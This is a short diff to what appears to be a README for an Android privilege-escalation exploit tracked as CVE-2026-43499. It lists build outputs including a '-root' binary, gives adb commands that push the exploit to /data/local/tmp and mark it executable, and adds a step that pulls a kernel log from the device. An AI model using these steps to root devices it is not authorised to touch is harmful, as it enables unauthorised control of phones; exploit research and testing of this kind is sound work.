@@ -50,6 +50,8 @@ build/<profile>/cve-2026-43499-app.so
 build/<profile>/cve-2026-43499-root
 ```
 
+adb pull /data/log/dumpstate_latest_lastkmsg.log.gz
+
 adb push build/cve-2026-43499 /data/local/tmp/cve-2026-43499
 adb push build/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
 adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
